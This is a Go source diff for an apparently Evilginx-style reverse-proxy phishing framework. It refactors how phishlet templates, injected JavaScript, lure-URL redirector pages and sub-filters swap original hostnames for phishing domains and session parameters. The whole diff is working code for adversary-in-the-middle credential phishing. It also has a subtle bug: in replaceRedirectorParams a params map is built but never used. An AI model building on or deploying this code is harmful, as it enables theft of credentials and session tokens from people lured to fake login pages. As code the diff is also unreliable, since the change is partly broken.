@@ -32,6 +32,7 @@ import (
 	"mime"
 	"mime/multipart"
 	"net/textproto"
+	"maps"
 
 	"golang.org/x/net/proxy"
 
@@ -233,17 +234,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						js_id = js_id[:len(js_id)-3]
 						if s, ok := p.sessions[session_id]; ok {
 							var d_body string
-							var js_params *map[string]string = nil
-							js_params = &s.Params
-
-							script, err := pl.GetScriptInjectById(js_id, js_params)
+							script, err := pl.GetScriptInjectById(js_id)
 							if err == nil {
 								d_body += script + "\n\n"
 							} else {
 								log.Warning("js_inject: script not found: '%s'", js_id)
 							}
-							d_body = strings.Replace(d_body, "{hostname}", p.cfg.PhishletConfig(pl.Name).Hostname, -1)
-							d_body = strings.Replace(d_body, "{enc_url}", EncryptUrlParams("", s.Params), -1)
+							params := map[string]string{
+								"phish_domain":p.cfg.PhishletConfig(pl.Name).Hostname,
+								"tracking_params":EncryptUrlParams("", s.Params),
+							}
+							maps.Copy(params, s.Params)
+							d_body = ReplaceParams(d_body, params)
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
 							return req, resp
 						} else {
@@ -511,7 +513,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, s)
+											body = p.replaceRedirectorParams(body, lure_url, s)
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
@@ -590,7 +592,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// redirect from lure path to login url
 						s, ok := p.sessions[ps.SessionId]
 						if ok {
-							rurl := s.ReplaceSessionParams(pl.GetLoginUrl())
+							rurl := ReplaceParams(pl.GetLoginUrl(), s.Params)
 							u, err := url.Parse(rurl)
 							if err == nil {
 								if strings.ToLower(req_path) != strings.ToLower(u.Path) {
@@ -1310,6 +1312,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
+						// handle auto filters
+						if stringExists(mime, p.auto_filter_mimes) {
+							for _, ph := range pl.proxyHosts {
+								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+									if ph.auto_filter {
+										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+									}
+								}
+							}
+						}
 						// handle sub_filters
 						sfs, ok := pl.subfilters[req_hostname]
 						if ok {
@@ -1348,28 +1360,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											replace_s := sf.replace
 											phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
 											phish_sub, _ := p.getPhishSub(phish_hostname)
+											phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
 
-											re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
-											re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
-											re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
-											re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-											re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
-											re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
-											re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
-											re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-											replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
-											replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
-											replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
-											replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
-											replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
-											replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
-											replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
-											replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-											phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-											if ok {
-												replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
-												replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
+											params := map[string]string{
+												"phish_hostname":phish_hostname,
+												"phish_subdomain":phish_sub,
+												"phish_domain":phishDomain,
+												"orig_hostname":combineHost(sf.subdomain, sf.domain),
+												"orig_subdomain":sf.subdomain,
+												"orig_domain":sf.domain,
+												"phish_basedomain":p.cfg.GetBaseDomain(),
 											}
+
+											if s, ok := p.sessions[ps.SessionId]; ok {
+												maps.Copy(params, s.Params)
+											}
+											
+											re_s = ReplaceParams(re_s, params)
+											replace_s = ReplaceParams(replace_s, params)
 
 											if re, err := regexp.Compile(re_s); err == nil {
 												body = []byte(re.ReplaceAllString(string(body), replace_s))
@@ -1381,18 +1389,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
-
-						// handle auto filters (if enabled)
-						if stringExists(mime, p.auto_filter_mimes) {
-							for _, ph := range pl.proxyHosts {
-								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
-									if ph.auto_filter {
-										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
-									}
-								}
-							}
-						}
-						body = []byte(removeObfuscatedDots(string(body)))
 					}
 				}
 
@@ -1610,7 +1606,7 @@ func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	return false
 }
 
-func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, s *Session) string {
+func (p *HttpProxy) replaceRedirectorParams(body string, lure_url string, s *Session) string {
 
 	lure_url_raw := lure_url
 	u, _ := url.Parse(lure_url)
@@ -1628,28 +1624,14 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, s *Session) 
 
 	lure_url += "?" + strings.ToLower(GenRandomString(3)) + "=" + fwd_param
 
-	var js_url string
-	n := 0
-	for n < len(lure_url) {
-		t := make([]byte, 1)
-		rand.Read(t)
-		rn := int(t[0])%3 + 1
-		if rn+n > len(lure_url) {
-			rn = len(lure_url) - n
-		}
-		if n > 0 {
-			js_url += " + "
-		}
-		js_url += "'" + lure_url[n:n+rn] + "'"
-		n += rn
+	params := map[string]string{
+		"lure_url_raw":lure_url_raw,
+		"lure_url":lure_url,
+		"phish_hostname":u.Host,
+		"orig_hostname":orig_hostname,
 	}
-
-	body = s.ReplaceSessionParams(body)
-	body = strings.Replace(body, "{lure_url_raw}", lure_url_raw, -1)
-	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
-	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
-	body = strings.Replace(body, "{hostname}", u.Host, -1)
-	body = strings.Replace(body, "{orig_hostname}", orig_hostname, -1)
+	maps.Copy(params, s.Params)
+	body = ReplaceParams(body, s.Params)
 
 	return body
 }
